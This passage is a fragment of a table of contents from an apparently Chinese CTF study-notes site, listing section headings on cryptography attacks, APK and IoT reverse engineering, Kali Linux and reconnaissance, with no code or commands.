class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81Attack-amp-Defense-%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.7.</span> <span class="toc-text">七、Attack&amp;Defense 模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E4%BF%AE%E8%A1%A5%E6%96%B9%E6%A1%88"><span class="toc-number">3.7.1.</span> <span class="toc-text">（一）修补方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%94%BB%E9%98%B2%E7%AD%96%E7%95%A5"><span class="toc-number">3.7.2.</span> <span class="toc-text">（二）攻防策略</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto%E7%AC%94%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">Crypto笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Crypto%E6%A6%82%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">一、Crypto概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">二、编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89hex%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text">（一）hex编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89urlencode%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.2.</span> <span class="toc-text">（二）urlencode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89morsecode%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.3.</span> <span class="toc-text">（三）morsecode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89jsfuck%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.4.</span> <span class="toc-text">（四）jsfuck编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89uuencode%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.5.</span> <span class="toc-text">（五）uuencode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89base%E5%AE%B6%E6%97%8F%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.6.</span> <span class="toc-text">（六）base家族编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">三、古典密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E7%A7%BB%E4%BD%8D%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.</span> <span class="toc-text">（一）移位密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E7%A7%BB%E4%BD%8D%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">1. 简单移位密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9B%B2%E8%B7%AF%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">2. 曲路密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BA%91%E5%BD%B1%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.3.</span> <span class="toc-text">3. 云影密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.4.</span> <span class="toc-text">4. 栅栏密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%9B%BF%E4%BB%A3%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.</span> <span class="toc-text">（二）替代密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">1. 凯撒密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-ROT13"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">2. ROT13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%83%E7%89%B9%E5%B7%B4%E4%BB%80%E7%A0%81"><span class="toc-number">4.3.2.3.</span> <span class="toc-text">3. 埃特巴什码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%BB%8F%E5%85%B8%E5%8D%95%E8%A1%A8%E6%9B%BF%E4%BB%A3%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.4.</span> <span class="toc-text">4. 经典单表替代密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.5.</span> <span class="toc-text">5. 培根密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E4%BB%A3%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.6.</span> <span class="toc-text">6. 图形替代密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.7.</span> <span class="toc-text">7. 仿射密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E5%A4%9A%E8%A1%A8%E6%9B%BF%E4%BB%A3%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.8.</span> <span class="toc-text">8. 多表替代密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">四、现代密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%92%8C%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81"><span class="toc-number">4.4.1.</span> <span class="toc-text">（一）分组密码和序列密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-DES-AES%E5%9F%BA%E6%9C%AC%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">1. DES&#x2F;AES基本加解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81CBC-bit%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">2. 分组密码CBC bit翻转攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81CBC%E9%80%89%E6%8B%A9%E5%AF%86%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.1.3.</span> <span class="toc-text">3. 分组密码CBC选择密文攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81CBC-padding-oracle%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.1.4.</span> <span class="toc-text">4. 分组密码CBC padding oracle攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Feistel%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">4.4.1.5.</span> <span class="toc-text">5. Feistel结构分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%94%BB%E5%87%BB%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8"><span class="toc-number">4.4.1.6.</span> <span class="toc-text">6. 攻击伪随机数发生器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81"><span class="toc-number">4.4.2.</span> <span class="toc-text">（二）公钥密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-RSA%E5%9F%BA%E7%A1%80"><span class="toc-number">4.4.2.1.</span> <span class="toc-text">1. RSA基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9B%B4%E6%8E%A5%E6%A8%A1%E6%95%B0%E5%88%86%E8%A7%A3"><span class="toc-number">4.4.2.2.</span> <span class="toc-text">2. 直接模数分解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%B4%B9%E9%A9%AC%E5%88%86%E8%A7%A3%E5%92%8CPollard-rho%E5%88%86%E8%A7%A3"><span class="toc-number">4.4.2.3.</span> <span class="toc-text">3. 费马分解和Pollard_rho分解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%AC%E7%BA%A6%E6%95%B0%E6%A8%A1%E6%95%B0%E5%88%86%E8%A7%A3"><span class="toc-number">4.4.2.4.</span> <span class="toc-text">4. 公约数模数分解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%85%B6%E4%BB%96%E6%A8%A1%E6%95%B0%E5%88%86%E8%A7%A3%E6%96%B9%E5%BC%8F"><span class="toc-number">4.4.2.5.</span> <span class="toc-text">5. 其他模数分解方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%B0%8F%E6%8C%87%E6%95%B0%E6%98%8E%E6%96%87%E7%88%86%E7%A0%B4"><span class="toc-number">4.4.2.6.</span> <span class="toc-text">6. 小指数明文爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E9%80%89%E6%8B%A9%E5%AF%86%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.2.7.</span> <span class="toc-text">7. 选择密文攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-LLL-attack"><span class="toc-number">4.4.2.8.</span> <span class="toc-text">8. LLL - attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-Wiener-Attack-amp-Boneh-Durfee-Attack"><span class="toc-number">4.4.2.9.</span> <span class="toc-text">9. Wiener Attack&amp;Boneh Durfee Attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.2.10.</span> <span class="toc-text">10. 共模攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.2.11.</span> <span class="toc-text">11. 广播攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E7%9B%B8%E5%85%B3%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.2.12.</span> <span class="toc-text">12. 相关消息攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-DSA"><span class="toc-number">4.4.2.13.</span> <span class="toc-text">13. DSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%93%88%E5%B8%8C"><span class="toc-number">4.4.3.</span> <span class="toc-text">（三）哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E"><span class="toc-number">4.4.3.1.</span> <span class="toc-text">1. 哈希碰撞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.3.2.</span> <span class="toc-text">2. 哈希长度扩展攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">4.5.</span> <span class="toc-text">五、真题解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89SUPEREXPRESS"><span class="toc-number">4.5.1.</span> <span class="toc-text">（一）SUPEREXPRESS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89VIGENERE"><span class="toc-number">4.5.2.</span> <span class="toc-text">（二）VIGENERE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89Revolver"><span class="toc-number">4.5.3.</span> <span class="toc-text">（三）Revolver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89Railgun"><span class="toc-number">4.5.4.</span> <span class="toc-text">（四）Railgun</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">4.6.</span> <span class="toc-text">六、总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#APK%E7%AC%94%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">APK笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81APK%E5%9F%BA%E7%A1%80"><span class="toc-number">5.1.</span> <span class="toc-text">一、APK基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Android%E9%A2%98%E7%9B%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.1.1.</span> <span class="toc-text">（一）Android题目类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Android%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-number">5.1.2.</span> <span class="toc-text">（二）Android基本架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89ARM%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">5.1.3.</span> <span class="toc-text">（三）ARM架构基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89adb%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.4.</span> <span class="toc-text">（四）adb工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89APK%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">5.1.5.</span> <span class="toc-text">（五）APK文件格式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Dalvik%E5%B1%82%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">二、Dalvik层逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Dalvik%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">5.2.1.</span> <span class="toc-text">（一）Dalvik基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.2.</span> <span class="toc-text">（二）静态分析工具与方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.3.</span> <span class="toc-text">（三）动态调试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89Dalvik%E5%B1%82%E6%B7%B7%E6%B7%86%E5%8F%8A%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF"><span class="toc-number">5.2.4.</span> <span class="toc-text">（四）Dalvik层混淆及加固技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Native%E5%B1%82%E9%80%86%E5%90%91"><span class="toc-number">5.3.</span> <span class="toc-text">三、Native层逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Native%E5%B1%82%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.3.1.</span> <span class="toc-text">（一）Native层介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BD%BF%E7%94%A8IDA-Pro%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">5.3.2.</span> <span class="toc-text">（二）使用IDA Pro静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95-1"><span class="toc-number">5.3.3.</span> <span class="toc-text">（三）动态调试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89OLLVM%E6%B7%B7%E6%B7%86%E5%8F%8A%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF"><span class="toc-number">5.3.4.</span> <span class="toc-text">（四）OLLVM混淆及加固技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">5.4.</span> <span class="toc-text">四、总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IoT%E7%AC%94%E8%AE%B0"><span class="toc-number">6.</span> <span class="toc-text">IoT笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81IoT%E4%B8%8E%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80"><span class="toc-number">6.1.</span> <span class="toc-text">一、IoT与嵌入式系统基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89IoT-%E6%A6%82%E8%BF%B0"><span class="toc-number">6.1.1.</span> <span class="toc-text">（一）IoT 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.1.2.</span> <span class="toc-text">（二）嵌入式系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CTF-%E4%B8%AD-IoT-%E9%A2%98%E5%9E%8B%E5%88%86%E6%9E%90"><span class="toc-number">6.2.</span> <span class="toc-text">二、CTF 中 IoT 题型分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B"><span class="toc-number">6.2.1.</span> <span class="toc-text">（一）逆向工程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88PWN%EF%BC%89"><span class="toc-number">6.2.2.</span> <span class="toc-text">（二）漏洞利用（PWN）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%8F%96%E8%AF%81%EF%BC%88forensic%EF%BC%89"><span class="toc-number">6.2.3.</span> <span class="toc-text">（三）取证（forensic）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%EF%BC%88MISC%EF%BC%89"><span class="toc-number">6.2.4.</span> <span class="toc-text">（四）协议分析（MISC）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E6%97%A0%E7%BA%BF%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90"><span class="toc-number">6.2.5.</span> <span class="toc-text">（五）无线信号分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81IoT-%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%8A%80%E5%B7%A7"><span class="toc-number">6.3.</span> <span class="toc-text">三、IoT 固件逆向工程技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%B8%B8%E8%A7%81-IoT-%E6%9E%B6%E6%9E%84"><span class="toc-number">6.3.1.</span> <span class="toc-text">（一）常见 IoT 架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%8A%AF%E7%89%87%E6%89%8B%E5%86%8C%E8%BF%90%E7%94%A8"><span class="toc-number">6.3.2.</span> <span class="toc-text">（二）芯片手册运用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89IDA-%E6%93%8D%E4%BD%9C%E6%8A%80%E5%B7%A7"><span class="toc-number">6.3.3.</span> <span class="toc-text">（三）IDA 操作技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E5%85%B7"><span class="toc-number">6.3.4.</span> <span class="toc-text">（四）调试环境与工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%9B%BA%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95"><span class="toc-number">6.4.</span> <span class="toc-text">四、固件结构分析方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%B8%B8%E8%A7%81%E5%9B%BA%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-number">6.4.1.</span> <span class="toc-text">（一）常见固件类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Flash-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.4.2.</span> <span class="toc-text">（二）Flash 文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%9B%BA%E4%BB%B6%E5%9F%BA%E5%9C%B0%E5%9D%80%E7%A1%AE%E5%AE%9A"><span class="toc-number">6.4.3.</span> <span class="toc-text">（三）固件基地址确定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">6.4.4.</span> <span class="toc-text">（四）固件分析工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%97%A0%E7%BA%BF%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E8%A6%81%E7%82%B9"><span class="toc-number">6.5.</span> <span class="toc-text">五、无线信号分析要点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA"><span class="toc-number">6.5.1.</span> <span class="toc-text">（一）基本理论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B0%83%E5%88%B6%E8%A7%A3%E8%B0%83%E6%96%B9%E5%BC%8F"><span class="toc-number">6.5.2.</span> <span class="toc-text">（二）调制解调方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89Matlab-%E5%BA%94%E7%94%A8"><span class="toc-number">6.5.3.</span> <span class="toc-text">（三）Matlab 应用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%BB%8F%E5%85%B8%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">6.6.</span> <span class="toc-text">六、经典赛题解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89PCTF2016%EF%BC%9AConfused-ARM"><span class="toc-number">6.6.1.</span> <span class="toc-text">（一）PCTF2016：Confused ARM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89UCTF2016-%E8%B5%84%E6%A0%BC%E8%B5%9B%EF%BC%9ATWI"><span class="toc-number">6.6.2.</span> <span class="toc-text">（二）UCTF2016 资格赛：TWI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89UCTF2016-%E5%86%B3%E8%B5%9B%EF%BC%9ANormandie"><span class="toc-number">6.6.3.</span> <span class="toc-text">（三）UCTF2016 决赛：Normandie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89ACTF2016%EF%BC%9A4G-Radio"><span class="toc-number">6.6.4.</span> <span class="toc-text">（四）ACTF2016：4G Radio</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89UCTF2016-%E8%B5%84%E6%A0%BC%E8%B5%9B%EF%BC%9A%E4%BC%A0%E6%84%9F%E5%99%A8-1-2"><span class="toc-number">6.6.5.</span> <span class="toc-text">（五）UCTF2016 资格赛：传感器(1)(2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89UCTF2016-%E8%B5%84%E6%A0%BC%E8%B5%9B%EF%BC%9AAdd"><span class="toc-number">6.6.6.</span> <span class="toc-text">（六）UCTF2016 资格赛：Add</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kali%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.</span> <span class="toc-text">Kali系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B"><span class="toc-number">7.1.</span> <span class="toc-text">（一）简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Kali-Linux-%E5%AE%89%E8%A3%85"><span class="toc-number">7.2.</span> <span class="toc-text">（二）Kali Linux 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E9%9D%B6%E6%9C%BA"><span class="toc-number">7.3.</span> <span class="toc-text">（三）靶机</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">8.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E5%BF%B5"><span class="toc-number">8.1.</span> <span class="toc-text">（一）概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5"><span class="toc-number">8.2.</span> <span class="toc-text">（二）开源情报</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%BB%E5%8A%A8%E4%BE%A6%E6%9F%A5"><span class="toc-number">8.3.</span> <span class="toc-text">（三）主动侦查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%BC%E5%90%88%E4%BE%A6%E6%9F%A5"><span class="toc-number">8.4.</span> <span class="toc-text">（四）综合侦查</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">9.</span> <span class="toc-text">漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 